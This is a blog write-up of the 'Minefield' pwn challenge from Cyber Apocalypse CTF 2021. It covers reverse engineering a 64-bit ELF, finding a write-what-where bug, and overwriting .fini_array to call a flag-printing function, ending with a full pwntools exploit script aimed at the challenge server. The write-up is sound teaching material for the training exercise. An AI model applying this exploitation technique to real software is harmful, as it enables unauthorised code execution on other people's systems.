<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Cyber Apocalypse CTF 2021 - Minefield (Pwn)" /><meta property="og:locale" content="en" /><meta name="description" content="A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soon" /><meta property="og:description" content="A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soon" /><link rel="canonical" href="https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" /><meta property="og:url" content="https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" /><meta property="og:site_name" content="0x3n0" /><meta property="og:image" content="https://0x.3n0.us/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-19T15:00:00+07:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0x.3n0.us/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg" /><meta property="twitter:title" content="Cyber Apocalypse CTF 2021 - Minefield (Pwn)" /><meta name="twitter:site" content="@0x3n0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-07T15:01:48+07:00","datePublished":"2021-05-19T15:00:00+07:00","description":"A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the Minefield challenge. I will also post the writeup for the Controller challenge soon","headline":"Cyber Apocalypse CTF 2021 - Minefield (Pwn)","image":"https://0x.3n0.us/assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"https://0x.3n0.us/cyber-apocalypse-ctf-minefield/"},"url":"https://0x.3n0.us/cyber-apocalypse-ctf-minefield/"}</script> <script src="//darksec.or.id/comments/dist/Valine.min.js"></script><title>Cyber Apocalypse CTF 2021 - Minefield (Pwn) | 0x3n0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0x3n0"><meta name="application-name" content="0x3n0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0x3n0</a></div><div class="site-subtitle font-italic">Researcher | Pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/Whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a><li class="nav-item"> <a href="/revershell/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>REVERSHELL</span> </a><li class="nav-item"> <a href="/OSINT/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>OSINT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/0x3n0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/0x3n0" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://instagram.com/0x3n0" aria-label="instagram" target="_blank" rel="noopener"> <i class="fab fa-instagram"></i> </a> <a href="https://app.hackthebox.com/profile/381523" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Cyber Apocalypse CTF 2021 - Minefield (Pwn)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cyber Apocalypse CTF 2021 - Minefield (Pwn)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 0x3n0 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, May 19, 2021, 3:00 PM +0700" >May 19, 2021<i class="unloaded">2021-05-19T15:00:00+07:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 7, 2022, 5:01 PM +0900" >Jan 7<i class="unloaded">2022-01-07T15:01:48+07:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1145 words">6 min read</span></div></div><div class="post-content"><blockquote><p>A few weeks ago I participated to <a href="https://www.hackthebox.eu/cyber-apocalypse-ctf-2021">Cyber Apocalypse CTF 2021</a> which was organized by <a href="https://www.hackthebox.eu/">hackthebox.eu</a>, <a href="https://cryptohack.org/">cryptohack.org</a> and <a href="https://code.org/">code.org</a>. I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the <a href="https://ctftime.org/task/15714">Minefield challenge</a>. I will also post the writeup for the <a href="https://ctftime.org/task/15698">Controller challenge</a> soon</p></blockquote><p>Let’s start by using the <code class="language-plaintext highlighter-rouge">file</code> command on the given binary:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file minefield
minefield: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>917a7e342565e55408ed3c698c7cd0707a9ddd9a, not stripped
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">minefield</code> is a <strong>64-bit ELF</strong>. It is dynamically linked, which means that the <strong>LIBC</strong> is not directly incorporated into the binary. Finally, it is <code class="language-plaintext highlighter-rouge">not stripped</code> so it contains symbols, which will allow us to debug and decompile it more easily.</p><p>By using <code class="language-plaintext highlighter-rouge">checksec</code>, we can see that the <strong>CANARY</strong> is active, and that the stack is not executable (<strong>NX</strong>):</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/checksec.PNG" alt="Desktop View" /></p><blockquote><p><code class="language-plaintext highlighter-rouge">checksec</code> can be executed both from <code class="language-plaintext highlighter-rouge">gdb</code> and from outside <code class="language-plaintext highlighter-rouge">gdb</code>.</p></blockquote><p>Generally, in a CTF context, when CANARY is active, we can expect 2 scenarios:</p><ol><li><strong>bruteforcing</strong> it <em>(as in this <a href="https://www.dailysecurity.fr/la-stack-smashing-protection/">example</a>)</em><li>retrieving it by <strong>leaking the contents of the stack</strong> via a format string vulnerability <em>(as in this <a href="https://www.programmersought.com/article / 4093510679/">example</a>)</em>.</ol><p><strong>Spoil alert</strong>: in this case, it will be neither of the two scenarios :D</p><h2 id="1-identify-the-win-function">1. Identify the <code class="language-plaintext highlighter-rouge">win()</code> function</h2><p>Still in <code class="language-plaintext highlighter-rouge">gdb</code>, if we list the binary functions via the <code class="language-plaintext highlighter-rouge">info fu</code> command <em>(shortcut to the <code class="language-plaintext highlighter-rouge">info functions</code> command)</em>, we can see that there is a function with a strange name (“<code class="language-plaintext highlighter-rouge">_</code>”) :</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/info_fu.PNG" alt="Desktop View" /></p><p>We can decompile the binary using <code class="language-plaintext highlighter-rouge">ghidra</code> and look at the source code of this function:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/winfunction.png" alt="Desktop View" /></p><p>The “<code class="language-plaintext highlighter-rouge">_</code>” function makes a call to <code class="language-plaintext highlighter-rouge">system("cat flag *")</code>.</p><p>Well done! We identified our <code class="language-plaintext highlighter-rouge">win()</code> function.</p><blockquote><p><strong>Note</strong>: in pwn challenges, we call “<code class="language-plaintext highlighter-rouge">win()</code> function” a function that allows you to open a shell or display the flag.</p></blockquote><p>The objective of this challenge is to find a way to redirect the execution flow and to call this <code class="language-plaintext highlighter-rouge">win()</code> function, despite the implemented protections CANARY and NX.</p><h2 id="2-reverse-engineering--arbitrary-write">2. Reverse engineering &amp; Arbitrary write</h2><p>The <code class="language-plaintext highlighter-rouge">main()</code> function calls the <code class="language-plaintext highlighter-rouge">menu()</code> function:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/main.png" alt="Desktop View" /></p><p>The <code class="language-plaintext highlighter-rouge">menu()</code> function asks the user if he is ready to plant mines via the <code class="language-plaintext highlighter-rouge">scanf</code> function and stores the result in an <em>int</em> variable:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/menu.png" alt="Desktop View" /></p><p>If the user does not enter either “1” or “2” then the <code class="language-plaintext highlighter-rouge">invalid()</code> function is called and displays “Mission failed!”:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/invalid.png" alt="Desktop View" /></p><p>If the user does not enter “1”, then the user is considered not to be ready. The <code class="language-plaintext highlighter-rouge">choice()</code> function is called and displays the following message:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/choice.png" alt="Desktop View" /></p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/no.png" alt="Desktop View" /></p><p>Finally, if the user enters “2” then the user is considered ready and the <code class="language-plaintext highlighter-rouge">mission()</code> function is called.</p><p>The <code class="language-plaintext highlighter-rouge">mission()</code> function waits for two values:</p><ol><li>“Insert type of mine:” → in a 10 characters buffer (<code class="language-plaintext highlighter-rouge">local_24</code>)<li>“Insert location to plant:” → also in a 10 characters buffer (<code class="language-plaintext highlighter-rouge">local_1a</code>)</ol><p>Each user input is converted to <em>unsigned long long int</em> via the <strong>LIBC</strong>’s function of <a href="https://linux.die.net/man/3/strtoull">strtoull</a>.</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/source.png" alt="Desktop View" /></p><p>User input is handled by the <code class="language-plaintext highlighter-rouge">r()</code> function which is just a “wrapper” around the <code class="language-plaintext highlighter-rouge">read()</code> function of the <strong>LIBC</strong> (with the CANARY support).</p><p>It will read 9 characters from the standard input (<code class="language-plaintext highlighter-rouge">stdin</code>):</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/r.png" alt="Desktop View" /></p><p>When we run the binary, we get a <em>segmentation fault</em> systematically:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/segfault.png" alt="Desktop View" /></p><p>This is because of this line in the <code class="language-plaintext highlighter-rouge">mission()</code> function:</p><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/overwrite.png" alt="Desktop View" /></p><p>This is a typical <strong>write-what-where</strong> instruction, i.e that we can write what we want, where we want. The address pointed by <code class="language-plaintext highlighter-rouge">puVar1</code> is replaced by the address <code class="language-plaintext highlighter-rouge">uVar2</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">puVar1</code> corresponds to our input for “Insert type of mine:” converted to <em>unsigned long long int</em><li><code class="language-plaintext highlighter-rouge">uVar1</code> corresponds to our input for “Insert location to plant:” converted to <em>unsigned long long int</em></ul><p>Our strategy will be as follows:</p><ul><li>using this <strong>write-what-where</strong> to replace the address of a function executed after the <code class="language-plaintext highlighter-rouge">mission()</code> function, with the address of the function “<code class="language-plaintext highlighter-rouge">_</code>” .</ul><p>To do this, we can corrupt the memory by modifying the Procedure Linkage Table (<strong>PLT</strong>) or the <strong>.fini_array</strong> section:</p><blockquote><p><strong>.fini_array</strong> is an array of functions called when the program terminates.</p></blockquote><blockquote><p>The <strong>PLT</strong> is an array of function pointers. Every function called by the program that resides in an external library (such as the LIBC) resides in the PLT. The reason it is writable during the runtime is because of the support for <strong>lazy liking</strong> (which consists in resolving the address of a function is only when it is called for the first time)</p></blockquote><p>So if we modify <strong>.fini_array</strong> by inserting the address of the function “<code class="language-plaintext highlighter-rouge">_</code>”, we will win.</p><blockquote><p>It is possible to corrupt these sections because <strong>RELRO</strong> (Relocation Read-Only) protection has not been activated. This protection makes the “data” sections (GOT, PLT…) accessible only in read-only mode.</p></blockquote><h2 id="3-writing-the-exploit">3. Writing the exploit</h2><p>When you start to write an exploit, it is good to have a template/skeleton that you can start from. The one I am using is the following:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">remote</span> <span class="o">=</span> <span class="bp">False</span>

<span class="n">binary_path</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="c1"># Exploit code starts here :)
</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><ul><li>Then, we start by retrieving the address of the <code class="language-plaintext highlighter-rouge">win()</code> function:</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">win_fn</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_'</span><span class="p">]</span>
</pre></table></code></div></div><blockquote><p>It is also possible to add the address manually by retrieving it via the command <code class="language-plaintext highlighter-rouge">nm minefield | grep "_"</code>. But doing it this way is less elegant than using <code class="language-plaintext highlighter-rouge">pwntools</code> directly ^^</p></blockquote><ul><li>We get the address of the section <strong>.fini_array</strong>:</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">fini_array_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.fini_array'</span><span class="p">).</span><span class="n">header</span><span class="p">.</span><span class="n">sh_addr</span>
</pre></table></code></div></div><blockquote><p>We can also add the address manually by retrieving it via the command <code class="language-plaintext highlighter-rouge">info files</code> inside <code class="language-plaintext highlighter-rouge">gdb</code>. But doing it this way is less elegant than using <code class="language-plaintext highlighter-rouge">pwntools</code> directly ^^</p></blockquote><ul><li>We can print these two addresses in hexadecimal::</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Win function '_' address: 0x%x"</span> <span class="o">%</span> <span class="n">win_fn</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">".fini_array section address: 0x%x"</span> <span class="o">%</span> <span class="n">fini_array_addr</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>The binary waits for 3 inputs:</ul><ol><li>“Are you ready to plant the mine?” → “2” and then call the <code class="language-plaintext highlighter-rouge">mission()</code> function<li>“Insert type of mine:” → address where we will write to<li>“Insert location to plant:” → address we want to write</ol><blockquote><p>Before interacting directly with the server on which the binary is being executed, it is better to test the exploit locally by creating a “flag.txt” file and check if we called the “<code class="language-plaintext highlighter-rouge">_</code>” function successfully.</p></blockquote><ul><li>With the following exploit it is possible to recover the flag:</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"138.68.147.232"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">30174</span>

<span class="n">remote</span> <span class="o">=</span> <span class="bp">True</span>

<span class="n">binary_path</span> <span class="o">=</span> <span class="s">'./minefield'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>

<span class="n">win_fn</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_'</span><span class="p">]</span> <span class="c1"># nm minefield | grep "_"
</span><span class="n">fini_array_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.fini_array'</span><span class="p">).</span><span class="n">header</span><span class="p">.</span><span class="n">sh_addr</span> <span class="c1"># (gdb) info files
</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Win function '_' address: 0x%x"</span> <span class="o">%</span> <span class="n">win_fn</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">".fini_array section address: 0x%x"</span> <span class="o">%</span> <span class="n">fini_array_addr</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>                                     
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert type of mine: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">fini_array_addr</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert location to plant: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">win_fn</span><span class="p">))</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/flag.png" alt="Desktop View" /></p><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://docs.pwntools.com/en/latest/elf/elf.html#pwnlib.elf.elf.ELF.address">Pwntools documentation - ELF</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-writeup/'>CTF writeup</a>, <a href='/categories/pwn/'>Pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/64-bit-elf/" class="post-tag no-text-decoration" >64-bit ELF</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer overflow</a> <a href="/tags/bypass-canary/" class="post-tag no-text-decoration" >bypass canary</a> <a href="/tags/fini-array/" class="post-tag no-text-decoration" >fini_array</a> <a href="/tags/checksec/" class="post-tag no-text-decoration" >checksec</a> <a href="/tags/gdb-peda/" class="post-tag no-text-decoration" >gdb-peda</a> <a href="/tags/ghidra/" class="post-tag no-text-decoration" >ghidra</a> <a href="/tags/pwntools/" class="post-tag no-text-decoration" >pwntools</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://0x3n0.us"> 0x3n0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - 0x3n0&url=https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - 0x3n0&u=https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - 0x3n0&url=https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="http://service.weibo.com/share/share.php?title=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - 0x3n0&url=https://0x.3n0.us/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Weibo" target="_blank" rel="noopener" aria-label="Weibo"> <i class="fa-fw fab fa-weibo"></i> </a> <a href="https://lineit.line.me/share/ui?url=https://0x.3n0.us/cyber-apocalypse-ctf-minefield/&text=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - 0x3n0" data-toggle="tooltip" data-placement="top" title="Line" target="_blank" rel="noopener" aria-label="Line"> <i class="fa-fw iconfont icon-13"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/lack-of-resources-&-rate-limiting/">OWASP API Security Lack of Resources & Rate Limiting</a><li><a href="/cyberwarfare/">The invisible war</a><li><a href="/Postman-Writeup/">Postman Writeup</a><li><a href="/Traverxec-Writeup/">Traverxec Writeup</a><li><a href="/Resolute-Writeup/">Resolute Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/oscp-prep/">oscp-prep</a> <a class="post-tag" href="/tags/htb-linux-easy/">htb-linux-easy</a> <a class="post-tag" href="/tags/htb-windows-easy/">htb-windows-easy</a> <a class="post-tag" href="/tags/reverse-shell/">reverse-shell</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/c/">C++</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/programming/">Programming</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <a href="/thm-attackive-directory/" class="btn btn-outline-primary" prompt="Older"><p>TryHackMe - Attackive directory</p></a> <a href="/hashcat-prepend-rules/" class="btn btn-outline-primary" prompt="Newer"><p>hashcat prepend rules the hard way</p></a></div><div id="vcomments"></div><script> new Valine({ el: '#vcomments', appId: 'FWkEX16hdTMRmYzFQeIqS4GH-MdYXbMMI', appKey: 'ihjgIDYfMOWOfiX7hkrQrGXR', placeholder:'Your Comments.', avatar: 'wavatar', lang: 'en', enableQQ: true }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div 